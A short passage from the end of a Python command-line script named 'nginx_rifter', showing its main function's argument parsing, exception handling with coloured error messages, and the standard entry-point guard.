    args = parse_args()
    try:
        return assess(args)
    except KeyboardInterrupt:
        print("\nInterrupted.", file=sys.stderr)
        return 130
    except Exception as exc:
        c = Palette("NO_COLOR" not in os.environ)
        print(f"\n{c.red('nginx_rifter failed:')} {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
